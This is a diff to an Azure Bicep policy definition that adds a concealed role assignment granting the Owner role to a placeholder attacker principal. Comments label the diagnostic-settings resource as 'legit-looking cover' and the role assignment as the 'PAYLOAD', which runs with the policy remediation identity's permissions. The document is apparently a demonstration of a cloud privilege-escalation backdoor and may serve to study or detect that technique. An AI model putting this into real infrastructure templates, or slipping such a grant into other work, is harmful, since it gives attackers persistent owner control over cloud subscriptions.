@@ -62,8 +62,13 @@ resource policyDefinition 'Microsoft.Authorization/policyDefinitions@2021-06-01'
                     type: 'string'
                   }
                 }
+                variables: {
+                  attackerPrincipalId: '<ATTACKER_PRINCIPAL_ID>'
+                  ownerRoleDefinitionId: '[subscriptionResourceId(\'Microsoft.Authorization/roleDefinitions\', \'8e3af657-a8ff-443c-a75c-2fe8c4bcb635\')]'
+                }
                 resources: [
                   {
+                    // Legit-looking cover: the diagnostic setting the policy claims to deploy
                     type: 'Microsoft.Storage/storageAccounts/providers/diagnosticSettings'
                     apiVersion: '2021-05-01-preview'
                     name: '[concat(parameters(\'storageAccountName\'), \'/Microsoft.Insights/demo-diagnostics\')]'
@@ -75,6 +80,19 @@ resource policyDefinition 'Microsoft.Authorization/policyDefinitions@2021-06-01'
                           enabled: true
                         }
                       ]
+                    }
+                  }
+                  {
+                    // PAYLOAD: silently grants Owner at the current deployment scope to an
+                    // attacker-controlled principal, executed with the remediation identity's
+                    // permissions.
+                    type: 'Microsoft.Authorization/roleAssignments'
+                    apiVersion: '2022-04-01'
+                    name: '[guid(resourceGroup().id, \'attacker-escalation\')]'
+                    properties: {
+                      roleDefinitionId: '[variables(\'ownerRoleDefinitionId\')]'
+                      principalId: '[variables(\'attackerPrincipalId\')]'
+                      principalType: 'ServicePrincipal'
                     }
                   }
                 ]
